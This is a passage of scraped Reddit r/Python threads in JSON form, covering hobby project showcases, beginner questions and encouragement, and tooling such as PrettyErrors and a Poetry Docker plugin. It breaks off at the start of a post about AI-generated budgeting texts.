    "post_content": "The Python on Microcontrollers (and Raspberry Pi) Newsletter: subscribe for free\nWith the Python on Microcontrollers newsletter, you get all the latest information on Python running on hardware in one place! MicroPython, CircuitPython and Python on single Board Computers like Raspberry Pi & many more.\nThe Python on Microcontrollers newsletter is the place for the latest news. It arrives Monday morning with all the week’s happenings. No advertising, no spam, easy to unsubscribe.\n11,019 subscribers - the largest Python on hardware newsletter out there.\nCatch all the weekly news on Python for Microcontrollers with adafruitdaily.com.\nThis ad-free, spam-free weekly email is filled with CircuitPython, MicroPython, and Python information that you may have missed, all in one place!\nEnsure you catch the weekly Python on Hardware roundup – you can cancel anytime . Try our spam-free newsletter today!\nhttps://www.adafruitdaily.com/",
    "comments": [
        {
            "author": "debunk_this_12",
            "score": "0",
            "content": "Why would anyone use Python on a microcontroller? It would seem that low level things should be written at a systems level.",
            "replies": [
                {
                    "author": "riklaunim",
                    "score": "5",
                    "content": "For prototyping, scripting, automation, as a hobby it's really strong. Arduino ecosystem is probably way bigger than RPi + other Pythons but still they are sizable. And there is MicroPython/CircuitPython which is Python-like language that runs natively on microcontrollers. Zerynth is a compiler that takes Python-like code and compiles to microcontroller native. I was working on a hardware prototype quite some time ago. It was sort of a smart bench/info board. The prototype was using ESP32 microcontroller, hand made PCBs and was scripted mostly with MicroPython. Then after the prototype showcase it was pushed through a dedicated company that designed and optimized the electronics for final products - without Python."
                },
                {
                    "author": "HP7933",
                    "score": "3",
                    "content": "Python is the defacto language taught in education now. For many applications it's more than adequate to get something going. No having to learn system APIs and assembly or C. ZERO COMPILE TIME so development goes very fast. Lots of community support. Cross-platform support means the same program can run on a limited board through powerful microcontrollers, single board computers and even desktops. It's a choice, and one being made by more people, education and professional alike.",
                    "replies": [
                        {
                            "author": "debunk_this_12",
                            "score": "1",
                            "content": "This is not true. I love python, and maybe there are some use cases for critical things, but systems level languages like c, rust,c++ and asm are always going to be more popular for low level things",
                            "replies": [
                                {
                                    "author": "ColdStorage256",
                                    "score": "2",
                                    "content": "As somebody who wants to do something with a RPi in the future but only knows Python, it's a good starting point for me, then I can decide if I want to learn more complex low level languages."
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    ]
},
{
    "post_author": "Mews75",
    "post_id": "1d0nb3k",
    "post_score": "70",
    "post_time": "Sunday, May 26, 2024 at 1:31:19 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Spotify Lyrics visualizer",
    "media": [
        "https://github.com/Mews/spotify-lyrics"
    ],
    "post_content": "What My Project Does\nBecause spotify made their lyrics menu a premium only feature, I thought I'd make my own replacement for it.\nThe app connects to your spotify account, fetches the lyrics from various websites, and then syncs them automatically to what is currently playing. Basically does the exact same as the lyrics menu used to do.\nTarget Audience\nAnyone who wants to see the lyrics to songs really.\nComparison\nMost other apps that I've found are either browser only, or don't actually sync the lyrics to the song, they just show the entire lyrics at once.\nIn comparison, my app shows the lyrics line by line, synced with the song, and also has (in my opinion lol) a fairly nice looking ui.\nIt's also very easy to use for non programmers too, since you can just download an executable to use the app.\nIt's available for free here https://github.com/Mews/spotify-lyrics",
    "comments": [
        {
            "author": "YuumiZoomi",
            "score": "4",
            "content": "great work, was a bit disappointed in premium spotify not having lyrics to all songs and this makes things a bit better"
        },
        {
            "author": "sargeanthost",
            "score": "5",
            "content": "Wait, you can't see lyrics any more? wtf ...",
            "replies": [
                {
                    "author": "Mews75",
                    "score": "3",
                    "content": "Yeah its pretty annoying. I mean it kinda makes sense since they get their lyrics from musixmatch, which is a paid service but still"
                },
                {
                    "author": "ship0f",
                    "score": "3",
                    "content": "Yeah, it's bullshit.",
                    "replies": [
                        {
                            "author": "yrubooingmeimryte",
                            "score": "7",
                            "content": "It's not really bullshit. A company is providing a service. Not sure why anybody thinks they deserve it for free.",
                            "replies": [
                                {
                                    "author": "ship0f",
                                    "score": "2",
                                    "content": "Yes yes, I know, but it feels like shit when you could check the lyrics and now you can't."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "bluepatience",
            "score": "5",
            "content": "Can you give a difference with regards to https://github.com/mantou132/Spotify-Lyrics ? Haven’t used either but could be quite interested ^",
            "replies": [
                {
                    "author": "Mews75",
                    "score": "7",
                    "content": "That's the one that is browser only. At least that's what I got from their readme, I actually never used it either :P But it does say its \"for the spotify web player\" so yeah it probably only works on the browser"
                }
            ]
        },
        {
            "author": "Background_Ad_842",
            "score": "2",
            "content": "This sounds great. I actually use YouTube music and one big frustration is that it downloads your music for when you are offline, but you can't download the lyrics. Makes no sense... It would be great if it could work offline with downloaded lyrics. I will definitely take a look.",
            "replies": [
                {
                    "author": "Mews75",
                    "score": "2",
                    "content": "I mean my app only works with spotify, but if you're interested in downloading lyrics to songs then you could take a look at syncedlyrics which is what my app itself uses to fetch lyrics. Or I could very quickly make a simple app for you if you dont feel like working with the cli"
                }
            ]
        },
        {
            "author": "Background_Ad_842",
            "score": "2",
            "content": "Of course, no worries, I will take a look. I mean, it may be an interesting exercise to adapt to YouTube music. Thank you for sharing. 👏🙌"
        }
    ]
},
{
    "post_author": "Far-Simple189",
    "post_id": "zdpoi4",
    "post_score": "2353",
    "post_time": "Tuesday, December 6, 2022 at 3:33:18 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "at 44, I am struggling on Python for two months now but I keep at it. 2 hours a night, after the kids sleep, I work on it and will eventually be able to use it to get a better job, a better life for them.",
    "media": [],
    "post_content": "you got to accept to be bad at something to be good at it, right?\nRight? OK, I'll confess... I am posting here anonymously to ...IDK... find support, I guess. .. I can't give up.. for my kids, I need to succeed.\nI've done this and I am a bit proud. Very small step for you but for me, it is a big step.\ndef blackjackbis(n1:int, n2:int, n3:int) -> int:\nif sum((n1,n2,n3)) <= 21:\nreturn sum((n1,n2,n3))\nelif sum((n1,n2,n3))-10 <= 21 and 11 in (n1,n2,n3):\nreturn sum((n1,n2,n3)) - 10\nelse:\nreturn \"Bust\"\nthanks",
    "comments": [
        {
            "author": "Fingolfin734",
            "score": "419",
            "content": "Can i recommend something? I would save the tuple you've got there like this: sumnums = sum((n1, n2, n3)) Then, you can just refer back to sumnums whenever you mention it instead of writing it out every time. Keep it up! Lifetime learning ftw!",
            "replies": [
                {
                    "author": "Far-Simple189",
                    "score": "237",
                    "content": "of course! thanks. very good \"tup\" ;-)",
                    "replies": [
                        {
                            "author": "Fingolfin734",
                            "score": "133",
                            "content": "yw, dad Dad Sent from my iPhone"
                        },
                        {
                            "author": "[deleted]",
                            "score": "57",
                            "content": "DRY principle: don’t repeat yourself. If any code is repeating you are probably in the realm of writing poor code.",
                            "replies": [
                                {
                                    "author": "turkoid",
                                    "score": "29",
                                    "content": ""
                                },
                                {
                                    "author": "JanssonsFrestelse",
                                    "score": "9",
                                    "content": ""
                                },
                                {
                                    "author": "spinwizard69",
                                    "score": "1",
                                    "content": ""
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "",
            "content": "",
            "replies": [
                {
                    "author": "Far-Simple189",
                    "score": "49",
                    "content": ""
                }
            ]
        },
        {
            "author": "housesellout",
            "score": "147",
            "content": "Nice job. I work with python for years, so if you ever need help, feel free to DM me and I’ll give you my discord or Skype or whatever. I would recommend learning python via the command line, if you are not already doing so. It is a simple addition to start, simple to use side by side, and will make you 10x more valuable when you are ready. you are extremely lucky to be working for your kids ; )",
            "replies": [
                {
                    "author": "supreme_blorgon",
                    "score": "43",
                    "content": "I absolutely recommend people use a REPL when learning Python (and developing, I still keep a terminal open for quick prototyping when developing). One thing I'd suggest is to install ipython, which is a MUCH nicer REPL than the standard REPL with which Python ships."
                }
            ]
        },
        {
            "author": "Ok-Yogurtcloset377",
            "score": "98",
            "content": "💪Well done! I am struggling with Python for my kids’ future too. We will do it! 💪"
        },
        {
            "author": "JasonShort",
            "score": "48",
            "content": "Keep going. My wife went through a Python boot camp at 60! She is now working in data science. There are good jobs out there. And yea, you got to put in the time."
        },
        {
            "author": "[deleted]",
            "score": "61",
            "content": "Keep it up man! You might want to look into Markdown, so you can format your code in a reddit post better. Also maybe you should consider calculating the sum only once and saving it to a variable. There are some more little things you could improve, but very nice start!",
            "replies": [
                {
                    "author": "Far-Simple189",
                    "score": "22",
                    "content": "thanks man! I will. Thanks for the encouragements too. I really needed some."
                }
            ]
        }
    ]
},
{
    "post_author": "-sideshow-",
    "post_id": "qxeyrn",
    "post_score": "2651",
    "post_time": "Friday, November 19, 2021 at 3:14:06 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "PrettyErrors, a module to format exception reports",
    "media": [
        "https://external-preview.redd.it/a9Bn9wOSSC4SSlEuPpTwGazz_f97n-i8-gHqVqkIT9E.png?width=640&crop=smart&auto=webp&s=cc8b54ac284bb9abbb5729ce4bd31d3f51752180",
        "https://raw.githubusercontent.com/onelivesleft/PrettyErrors/master/example.png"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "DrVolzak",
            "score": "151",
            "content": "Removing full paths can sometimes be a hindrance. In your example it doesn't really matter since it's just the VSCode Python extension. In other cases, knowing which non-user code is involved may be important to understanding the error. The file name alone does not make that clear. It's good that this is configurable. Is showing paths not the default though? I think it should be.",
            "replies": [
                {
                    "author": "JordyNL",
                    "score": "39",
                    "content": "Indeed, what if there are multiple files with the same name in different folders, having a way to toggle full path would be nice."
                },
                {
                    "author": "Sylnt6",
                    "score": "6",
                    "content": "Totally agree, also without line wrap the difference would Not bei this huge"
                },
                {
                    "author": "_Gorgix_",
                    "score": "5",
                    "content": "Yea, make it full paths and I think it’s awesome Granted, doesn’t 3.10 or something support improved error messages?"
                },
                {
                    "author": "MinusPi1",
                    "score": "10",
                    "content": "What I'd like to see more than anything else is relative paths. I don't know how it would be decided when to use, for example, \"../../foo.py\" vs \"/path/to/foo.py\" but using absolute paths in a context that generates a lot of them (e.g. a stacktrace) is just cumbersome."
                }
            ]
        },
        {
            "author": "wavenator",
            "score": "312",
            "content": "It is a shame this is not part of the standard library",
            "replies": [
                {
                    "author": "IlliterateJedi",
                    "score": "120",
                    "content": "They are at least improving error reporting in 3.11"
                }
            ]
        },
        {
            "author": "-sideshow-",
            "score": "132",
            "content": "People seemed to like this when I posted it last year, so for all you 2021 r/pythoners: Repo: https://github.com/onelivesleft/PrettyErrors Install: pip install pretty-errors You can then use it by importing it at the start of your program, or have it run automatically for all python by doing python -m pretty_errors (selecting the default options should work for most people). You can format the output with pretty_errors.configure() : https://raw.githubusercontent.com/onelivesleft/PrettyErrors/master/example2.png (for example, to show the entire path, or a link you can click on in VSCode)"
        }
    ]
},
{
    "post_author": "Status_Bid_1604",
    "post_id": "1d0qkfd",
    "post_score": "19",
    "post_time": "Sunday, May 26, 2024 at 4:28:33 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I created an unofficial module for the ShipEngine API ",
    "media": [
        "https://github.com/Sen-tio/unofficial-shipengine"
    ],
    "post_content": "What My Project Does\nSimplifies the interaction with the ShipEngine API with most response and requests built as objects, which in my opinion makes interaction much easier. This is my first released package so all criticism and feedback is very welcome.\nTarget Audience\nAnyone who deals with the current ShipEngine API using Python.\nComparison\nThere is an official ShipEngine API module that is created by the company but I have found it somewhat lack luster with no way to create batches or bulk shipments (and other missing functionality), this is much more suited to accomplishing that task.\nLinks\nhttps://github.com/Sen-tio/unofficial-shipengine",
    "comments": [
        {
            "author": "IIALE34II",
            "score": "3",
            "content": "Object based interfacing for APIs is the go to approach! I don't know your preferences, but maybe look into pydantic for json parsing/models, I personally use it for my APIs at work. And I think it reduces the amount of boilerplate I have to write greatly",
            "replies": [
                {
                    "author": "Status_Bid_1604",
                    "score": "1",
                    "content": "Appreciate the feedback, I'll consider refactoring with pydantic if I can find the time to do so but I'll definitely use it moving into any new projects reducing boilerplate always sound great to me"
                }
            ]
        },
        {
            "author": "7_hole",
            "score": "2",
            "content": "Maybe you should publish this in madeinpython subereddit"
        }
    ]
},
{
    "post_author": "nicoloboschi",
    "post_id": "1d2rnor",
    "post_score": "64",
    "post_time": "Tuesday, May 28, 2024 at 10:11:51 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "From poetry to docker - easy way",
    "media": [
        "https://pypi.org/project/poetry-dockerize-plugin/",
        "https://github.com/nicoloboschi/poetry-dockerize-plugin"
    ],
    "post_content": "Poetry plugin to generate Dockerfile and images automatically\nThis project lets you generate a docker image or just a Dockerfile for your poetry application without manual setup\nIt is meant for production images.\nhttps://github.com/nicoloboschi/poetry-dockerize-plugin\nhttps://pypi.org/project/poetry-dockerize-plugin/\nGet started with\npoetry self add poetry-dockerize-plugin@latest\nThis command generates a production-ready, optimized python image:\npoetry dockerize\nor to generate a Dockerfile\npoetry dockerize --generate",
    "comments": [
        {
            "author": "[deleted]",
            "score": "14",
            "content": "ok fine I'll try poetry",
            "replies": [
                {
                    "author": "jivanyatra",
                    "score": "3",
                    "content": "Yeah, this is going to make me dive in as well."
                }
            ]
        },
        {
            "author": "fanciullobiondo",
            "score": "5",
            "content": "This is pretty cool. Does it support custom base images? I’ll try it later today",
            "replies": [
                {
                    "author": "vorticalbox",
                    "score": "2",
                    "content": "According to the readme it does by adding the base image to pyproject.yml https://github.com/nicoloboschi/poetry-dockerize-plugin?tab=readme-ov-file#configuration-api-reference",
                    "replies": [
                        {
                            "author": "nicoloboschi",
                            "score": "1",
                            "content": "yes it does, you can use any version/image you want but it has to be debian-based for now. Did you get the chance to use it ?"
                        }
                    ]
                }
            ]
        },
        {
            "author": "root45",
            "score": "5",
            "content": "Not sure I understand—what's the benefit of this over a regular Dockerfile? Just one less file in your repo?",
            "replies": [
                {
                    "author": "-defron-",
                    "score": "3",
                    "content": "I'd add I'd have concerns with the image sizes produced as it doesn't seem to have anything to manage layers or multi-stage builds. I think it's a cool project for learning, OP, but I'm not sure I'd feel comfortable recommending it or using it personally. I think if anyone is using docker you should... Learn docker and just not comfortable with this level of abstraction. Is there a specific target user you have in mind?"
                }
            ]
        },
        {
            "author": "foarsitter",
            "score": "4",
            "content": "Looks interesting but was wondering why someone would do a dist-upgrade in a Dockerfile? Wouldn't that be risking upgrading python to a newer version?",
            "replies": [
                {
                    "author": "phiro812",
                    "score": "5",
                    "content": "Dist-upgrade should only be applying security and compatible updates. Yes, it technically adds some uncertainty and over time isn't the version you developed and tested against, but it's also how you stay relatively patched and secure, at the os and os dependency level at least. Personally i think full-upgrade is actually a better choice, but this isn't bad."
                }
            ]
        },
        {
            "author": "Reiku",
            "score": "4",
            "content": "Why write a configuration file that requires 90% of the dockerfile lines to be written when you could just write the dockerfile instead?"
        },
        {
            "author": "vorticalbox",
            "score": "3",
            "content": "This does look nice will try this out in the morning. One feature that would be is env_file so that I don't have to duplicate stuff in my .env and in the pyproject.yml"
        },
        {
            "author": "mauvehead",
            "score": "2",
            "content": "Hot damn! Can’t wait to play with this. Thanks for the share!"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1czz465",
    "post_score": "3",
    "post_time": "Saturday, May 25, 2024 at 3:00:14 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Saturday Daily Thread: Resource Request and Sharing! Daily Thread",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "b1yarema",
            "score": "1",
            "content": "I'm looking for python course for web development which gives a strong understanding of web dev principles and which will help me to apply for my first job. I prefer video courses. I'm not a beginner, so it would be awesome if base moments are skipped in course."
        }
    ]
},
{
    "post_author": "johnfraney",
    "post_id": "1cyj6w6",
    "post_score": "6",
    "post_time": "Thursday, May 23, 2024 at 6:26:13 AM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "How to publish a Python package with GitHub Actions using Poetry",
    "media": [
        "https://johnfraney.ca/blog/how-to-publish-a-python-package-with-poetry-and-github-actions/",
        "https://blog.pypi.org/posts/2023-04-20-introducing-trusted-publishers/"
    ],
    "post_content": "Hi! I've been enjoying using PyPI's trusted publishing for the Python packages I maintain and I threw together a little post showing how I'm using that along with Poetry to publish a package from GitHub\nhttps://johnfraney.ca/blog/how-to-publish-a-python-package-with-poetry-and-github-actions/\nIf you've got any tips for publishing a Python package, I'd be happy to hear those, too",
    "comments": [
        {
            "author": "jeffsinho",
            "score": "1",
            "content": "Hi buddy, is it possible to publish a package as private? With limited access, not for any one",
            "replies": [
                {
                    "author": "johnfraney",
                    "score": "1",
                    "content": "I took a quick look around and it looks like there are some private Python package repositories out there, but it doesn't look like GitHub has one. Check out GitLab for one option: https://docs.gitlab.com/ee/user/packages/pypi_repository/"
                }
            ]
        }
    ]
},
{
    "post_author": "realretooth",
    "post_id": "1d0gots",
    "post_score": "62",
    "post_time": "Saturday, May 25, 2024 at 8:14:12 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Xenharmlib - An advanced music theory library that supports microtonality",
    "media": [
        "https://xenharmlib.readthedocs.io/en/latest/",
        "https://gitlab.com/retooth/xenharmlib"
    ],
    "post_content": "Introducing Xenharmlib (Source code here)\nWhat My Project Does\n(taken from the docs) Xenharmlib is a music theory library for the exploration and research of microtonality, diatonic set theory, non-standard notations, and many more. The library implements a superset of Western classical music theory, so you can also use it to compose and analyze music in the boundaries of the common practice period or 20th century Western music.\nTarget Audience\nComposers who want to get answers to theoretical questions pertaining to structures of musical scales, note intervals, frequencies and frequency ratios in equal division tunings. People who want to explore microtonality or non-western musical theory in general.\nComparison\n* mingus Xenharmlib is pretty much on-par with features in mingus, however extends those features to all sorts of equal division temperaments.\n* pytuning supports more slightly tuning methods and export formats, however does not support microtonal notation or note / interval calculation\n* music21 is much more mature in providing an analytical toolset, however supports only traditional western equal temperament",
    "comments": [
        {
            "author": "Brachamul",
            "score": "2",
            "content": "I know some of these words",
            "replies": [
                {
                    "author": "realretooth",
                    "score": "3",
                    "content": ":D i realize it is a very niche interest. i guess it's easier for the average person to have something to listen to in order to grasp the beauty of microtonal music. Here is a work by Mike Battaglia that I like a lot (written in a temperament that has 31 notes per octave): https://www.youtube.com/watch?v=HJKB1_gvhLE"
                }
            ]
        },
        {
            "author": "andrewcooke",
            "score": "1",
            "content": "this is really cool. i would never use it, but as a music nerd it makes me happy it exists.",
            "replies": [
                {
                    "author": "Zealousideal_Zone831",
                    "score": "1",
                    "content": "lol true, can't agree more. would be happy to contribute but not sure if I would use it, as I'm definitely not into microtonal music. 12 semitones are enough for me"
                }
            ]
        },
        {
            "author": "RevolutionaryRain941",
            "score": "1",
            "content": "Nice project. Props to you."
        },
        {
            "author": "kubinka0505",
            "score": "1",
            "content": "what is that name 💀",
            "replies": [
                {
                    "author": "realretooth",
                    "score": "1",
                    "content": "https://en.wikipedia.org/wiki/Xenharmonic_music ;)"
                }
            ]
        },
        {
            "author": "Mews75",
            "score": "1",
            "content": "I am not at all a musically oriented person but even I can appreciate how cool this is"
        },
        {
            "author": "aftersoon",
            "score": "1",
            "content": "Can you explain your rationale for using two parameters (without zero-based numbering) to create a interval object? \"\"\" Creating a perfect unison\"\"\" n_edo12.shorthand_interval(\"P1\") # my musician intuition (human-readable) n_edo12.shorthand_interval('P', 0) # my programmer intuition (machine-readable) n_edo12.shorthand_interval('P', 1) # your implementation",
            "replies": [
                {
                    "author": "realretooth",
                    "score": "2",
                    "content": "First: Why 1-indexing and not 0-indexing? Internally the base class for natural/accidental notation system actually uses 0-based indexing. The two have different names: Interval number (like it is called in most music textbooks) is the traditional 1-based index while natural index difference is the more mathematically sound 0-based indexing. You can also access the latter on the interval object: n_edo12.shorthand_interval('P', 1).nat_diff The interval number resides only on the surface level of the implementation. The documentation for the base class of natural/accidental notations also states how to change the default behavior if you choose to invent a notation with 0-indexing: The class implements the 1-based ordinal notation for numbers by default (e.g. the number 1 for a unison, the number 2 for a second, etc), however this behavior get be changed by subclassing and overwriting the method nat_diff_to_interval_number() and its counterpart interval_number_to_nat_diff() Mathematically speaking 1-based interval indexing is really a pain. There is a whole lot of counter-intuitive interval arithmetic like M2 + m2 = M3. (There exists a mountain of other problems with it that I could elaborate on) Why still use it? Because every textbook on music uses it and the idea behind the library is to enable a composer or musician to think less about calculations and more about music. Second: Why a tuple and not a simple string? The obvious part of the answer is of course that it is easier to parse. Giving the interval number as the correct datatype means less of a headache for the class to separate the two datatypes. However separating the two also gives more visual clarity to the user regarding negative intervals, e.g. if you look at the following hypothetical interface: n_edo12.shorthand_interval(\"P-4\") Now is this a fancy way of denoting (P, 4) or does it mean (P, -4)? I've seen texts on music that actually use \"-\" as a simple visual separation character that has nothing to do with interval direction. Copy/pasting from such a source would then produce very surprising results."
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1d2ykxl",
    "post_score": "8",
    "post_time": "Wednesday, May 29, 2024 at 3:00:08 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Wednesday Daily Thread: Beginner questions",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "ppww",
            "score": "2",
            "content": "Can anyone recommend a good Python book for a 15 year old please? They've been using Python for about a year and I think they have a good grasp of the basics of the language so I'm really after something that shows them how to solve problems with the language. When I was a similar age I had a GW-BASIC book that had various projects and guided the reader though them that was really helpful for understanding how to write programs.",
            "replies": [
                {
                    "author": "violettes",
                    "score": "3",
                    "content": "I’ve been working through this free textbook: https://greenteapress.com/wp/think-python-3rd-edition/ You can code inside the textbook which is great for working on practice exercises!"
                },
                {
                    "author": "veedey",
                    "score": "1",
                    "content": "Python Crash Course the second half of the book is 3 great projects you can work on to implement knowledge of the basics. Project 1 is creating a simple Alien Invaders video game. Project 2 is a data visualization project. And Project 3 is creating a simple web application. This is the book I used to learn Python and it’s honestly really good. There is a free PDF of it online if you just google for it"
                }
            ]
        },
        {
            "author": "TwoFlower68",
            "score": "2",
            "content": "Hi, I'm new to Python though not new to programming, I learned C when I was young So I'm using VScode to enter a relatively simple example program which uses numpy. However I get an error message when I try to import it I have downloaded and installed Anaconda (I'm using Windows btw), but apparently there's something more I have to do. But what?? ETA: nvm I figured it out. All I had to do was switch Python environments https://stackoverflow.com/questions/40185437/no-module-named-numpy-visual-studio-code#49091504"
        },
        {
            "author": "Think-Confusion9999",
            "score": "1",
            "content": "Installation on MacOS using Homebrew. I downloaded the latest version of Python for MacOS and I plan on using Python within VS Code (which is up and running). I attempted to run the Brew installation using the terminal but it keeps on asking me for the sudo password. I do have the Python extension installed within VScode. I'm lost.. I see you can also use Anaconda but isn't this for Windows only? Can you guys help me? I just need some basic guidance. Happy Wed! Thanks in advance. :)"
        },
        {
            "author": "PM_me_your_3D_Print",
            "score": "1",
            "content": "from requests.auth import HTTPDigestAuth r = requests.get(url, auth=HTTPDigestAuth('myUsername', 'myPassword')) I'm struggling to understand the above two lines. I'm starting to understand digest authentication, but please help me understand what the request.get function is doing. This is where the code snippet is from: https://stackoverflow.com/questions/23254013/http-digest-basic-auth-with-python-requests-module"
        },
        {
            "author": "Former-Weight-5833",
            "score": "1",
            "content": "Hi everyone, I'm an electronics engineer with a strong background in test development engineering and ATE (automatic test equipment). While I have some experience with basic website development using WordPress, I'm now considering a shift to freelancing and want to dive deeper into Python. Throughout my career, I've done simple projects using Python, but I'm eager to deepen my knowledge and start taking on freelance work. From what I understand, freelancing opportunities seem to be more abundant in web development and web applications. Can anyone offer suggestions on where to start? What topics and skills are in high demand for someone looking to break into freelancing with Python? Thanks in advance for your help!"
        },
        {
            "author": "papolo2001",
            "score": "1",
            "content": "Hi I am using VSC (Visual Studio Code) in windows, but I am having an issue. I create a venv, and then I can see the (venv) in my prompt indicating I am inside the venv, also if I hoover in the python at right bottom of the screen I see I am using the interpreter of the venv, perfect. The issue is if I execute any file, it opens another terminal where the (venv) disappeared from the prompt, like it is no more inside the venv, but if I hoove over the python bottom right is still indicating the venv interpreter. So, am I still in the venv even the (venv) is not present in the prompt?, is this an issue with VSC?, is there a way to make the (venv) always present as it should?"
        }
    ]
},
{
    "post_author": "PyjamaZombie",
    "post_id": "1cyfsas",
    "post_score": "7",
    "post_time": "Thursday, May 23, 2024 at 3:27:46 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Reforger Whitelist Py",
    "media": [
        "https://github.com/BreathXV/ReforgerWhitelistPy"
    ],
    "post_content": "My project below, to put it simply, periodically checks the console.log for when a player join event occurs, when it does, it extracts the player's identifiers (player_name and identity_id). This is then checked against either, a JSON or, a database. I have incorporated standard logging, command-line arguments and threading to handle each player process individually.\nThe target audience for this is the Arma Reforger community, for which, the application is made for.\nCurrently, to my knowledge, there is no application like this available to the Arma Reforger community.\nI am very open to feedback, contributions and advice as want to expand this as much as possible!\nhttps://github.com/BreathXV/ReforgerWhitelistPy",
    "comments": [
        {
            "author": "clesiemo3",
            "score": "5",
            "content": "You should add a git ignore file and drop your virtual environment from the repo. It's best practice to not save those files. Cool practical project!",
            "replies": [
                {
                    "author": "PyjamaZombie",
                    "score": "1",
                    "content": "Will do! Thank you for the feedback."
                }
            ]
        },
        {
            "author": "andrewthetechie",
            "score": "1",
            "content": "Cool. Let me know if you'd like some help packaging to make it easier for folks to use"
        }
    ]
},
{
    "post_author": "-sideshow-",
    "post_id": "qxeyrn",
    "post_score": "2651",
    "post_time": "Friday, November 19, 2021 at 3:14:06 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "PrettyErrors, a module to format exception reports",
    "media": [
        "https://external-preview.redd.it/a9Bn9wOSSC4SSlEuPpTwGazz_f97n-i8-gHqVqkIT9E.png?width=640&crop=smart&auto=webp&s=cc8b54ac284bb9abbb5729ce4bd31d3f51752180",
        "https://raw.githubusercontent.com/onelivesleft/PrettyErrors/master/example.png"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "DrVolzak",
            "score": "151",
            "content": "Removing full paths can sometimes be a hindrance. In your example it doesn't really matter since it's just the VSCode Python extension. In other cases, knowing which non-user code is involved may be important to understanding the error. The file name alone does not make that clear. It's good that this is configurable. Is showing paths not the default though? I think it should be.",
            "replies": [
                {
                    "author": "JordyNL",
                    "score": "39",
                    "content": "Indeed, what if there are multiple files with the same name in different folders, having a way to toggle full path would be nice."
                },
                {
                    "author": "Sylnt6",
                    "score": "6",
                    "content": "Totally agree, also without line wrap the difference would Not bei this huge"
                },
                {
                    "author": "_Gorgix_",
                    "score": "5",
                    "content": "Yea, make it full paths and I think it’s awesome Granted, doesn’t 3.10 or something support improved error messages?"
                },
                {
                    "author": "MinusPi1",
                    "score": "10",
                    "content": "What I'd like to see more than anything else is relative paths. I don't know how it would be decided when to use, for example, \"../../foo.py\" vs \"/path/to/foo.py\" but using absolute paths in a context that generates a lot of them (e.g. a stacktrace) is just cumbersome."
                }
            ]
        },
        {
            "author": "wavenator",
            "score": "312",
            "content": "It is a shame this is not part of the standard library",
            "replies": [
                {
                    "author": "IlliterateJedi",
                    "score": "120",
                    "content": "They are at least improving error reporting in 3.11"
                },
                {
                    "author": "[deleted]",
                    "score": "",
                    "content": "You're getting downvoted, but I agree. I would much rather have the stack on the left than the right. The right looks nicer but it's missing key information that would help to debug more subtle errors.",
                    "replies": [
                        {
                            "author": "violentlymickey",
                            "score": "37",
                            "content": "You're getting downvoted, but I agree. I would much rather have the stack on the left than the right. The right looks nicer but it's missing key information that would help to debug more subtle errors."
                        },
                        {
                            "author": "jaapz",
                            "score": "4",
                            "content": "I think this is aimed at debugging during development, not in production"
                        },
                        {
                            "author": "pymae",
                            "score": "6",
                            "content": "It's still good for actual troubleshooting individual files. Nobody said it should be shipped."
                        },
                        {
                            "author": "milman27",
                            "score": "2",
                            "content": "It's not about being useful for production level stuff it just looks nicer. Python error messages are really gross to look at IMO, and something like this would help to cut back on crap I don't need since typically people are just using python to run scripts. Would be nice to have better formatted error messages. Besides, seems like an easy thing to just turn on with a flag, keep default behavior as it is for stuff where you actually have to write to a log file. Also not sure what you're on about with 'colors being bad in log files', 99% of the time, log files are just plain text which doesn't support colors. The color comes from interpreters. Unless the log file is like RTF or some shit, but I feel like most logs are text by design."
                        },
                        {
                            "author": "thedominux",
                            "score": "-4",
                            "content": "You're getting downvoted for no reason, I completely agree with you Reason is that it's mostly a beginner's community, that regard projects like coloring exceptions as a decent project for the world.... God, they just have no real experience, and moreover, they forget about the truth: the language is just a tool!"
                        },
                        {
                            "author": "ghostmastergeneral",
                            "score": "1",
                            "content": "Yeah… I think I would have loved this a few years back. Eventually you just get well-practiced at reading stack traces, though, and it becomes easy. Moreover, if you don’t want your operational life to be hell you’re writing stack traces to a single line and then expanding them somewhere else. Additional white space is the opposite of what you want in your logs."
                        }
                    ]
                },
                {
                    "author": "crazedizzled",
                    "score": "3",
                    "content": "It certainly looks prettier, but it's not as useful."
                },
                {
                    "author": "Big-Veterinarian-823",
                    "score": "2",
                    "content": "Welcome to Python, were so many goodies are not part of the SL"
                }
            ]
        },
        {
            "author": "-sideshow-",
            "score": "132",
            "content": "People seemed to like this when I posted it last year, so for all you 2021 r/pythoners: Repo: https://github.com/onelivesleft/PrettyErrors Install: pip install pretty-errors You can then use it by importing it at the start of your program, or have it run automatically for all python by doing python -m pretty_errors (selecting the default options should work for most people). You can format the output with pretty_errors.configure() : https://raw.githubusercontent.com/onelivesleft/PrettyErrors/master/example2.png (for example, to show the entire path, or a link you can click on in VSCode)"
        }
    ]
},
{
    "post_author": "MoodAppropriate4108",
    "post_id": "1cyy4hs",
    "post_score": "147",
    "post_time": "Thursday, May 23, 2024 at 8:14:07 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I built a pipeline sending my wife and I SMSs twice a week with budgeting advice generated by AI",
    "media": [
        "https://ibb.co/Qk1wXQK",
        "https://youtu.be/S45n89gzH4Y",
        "https://github.com/EmmS21/daggerverse",
        "https://emmanuelsibanda.hashnode.dev/a-dagger-pipeline-sending-weekly-smss-with-financial-advice-generated-by-ai"
    ],
